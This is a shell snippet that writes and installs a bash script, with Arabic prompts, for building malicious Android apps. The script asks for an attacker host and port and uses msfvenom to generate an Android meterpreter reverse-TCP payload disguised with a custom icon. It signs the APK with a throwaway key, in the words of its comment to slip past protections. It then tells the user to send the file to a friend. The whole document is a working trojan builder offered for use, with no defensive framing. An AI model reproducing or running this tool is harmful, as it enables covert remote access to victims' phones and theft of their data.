cat << 'EOF' > ~/xxszmsx.sh
#!/bin/bash
# XXSZMSX FINAL PRO MAX EDITION

RED='\033[0;31m'
BRED='\033[1;31m'
NC='\033[0m'

clear
echo -e "${BRED}┌──────────────────────────────────────────────────────────┐${NC}"
echo -e "${BRED}│${NC}  ${RED} ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗ ${BRED}│${NC}"
echo -e "${BRED}│${NC}  ${RED} ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝ ${BRED}│${NC}"
echo -e "${BRED}│${NC}  ${RED}  ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝  ${BRED}│${NC}"
echo -e "${BRED}│${NC}  ${RED}  ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗  ${BRED}│${NC}"
echo -e "${BRED}│${NC}  ${RED} ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗ ${BRED}│${NC}"
echo -e "${BRED}│${NC}  ${RED} ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ${BRED}│${NC}"
echo -e "${BRED}└──────────────────────────────────────────────────────────┘${NC}"

echo -e "${RED}[†] نظام xxszmsx المطور جاهز يا مازن..${NC}"
read -p "[+] اسم التطبيق: " app_name
read -p "[+] الـ IP أو الرابط (LHOST): " lh
read -p "[+] البورت (LPORT): " lp

# تحديد مسار الصورة اللي أنت قلته
ICON_PATH="$HOME/icon.png"

echo -e "\n${RED}[*] جاري سحب الأيقونة من $ICON_PATH وحقنها...${NC}"

# بناء الـ APK ودمج الأيقونة تلقائياً
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R --icon $ICON_PATH -o "temp.apk" &> /dev/null

# توقيع التطبيق توقيع رقمي (V2/V3) عشان يتخطى الحماية
keytool -genkey -v -keystore mazen.keystore -alias mazen -keyalg RSA -keysize 2048 -validity 10000 -storepass blood123 -keypass blood123 -dname "CN=xxszmsx, OU=H, O=B, L=KW, S=AH, C=KW" &> /dev/null
apksigner sign --ks mazen.keystore --ks-pass pass:blood123 --out "$HOME/Downloads/$app_name.apk" temp.apk &> /dev/null

rm temp.apk mazen.keystore 2>/dev/null

echo -e "\n${BRED}==============================================${NC}"
echo -e "${BRED}✔ تم بنجاح! الملف جاهز بالأيقونة في Downloads${NC}"
echo -e "${BRED}✔ ابعته لصاحبك وهتظهر عنده صورة الجمجمة فورا${NC}"
echo -e "${BRED}==============================================${NC}"
read -p "اضغط Enter للعودة..."
EOF

chmod +x ~/xxszmsx.sh
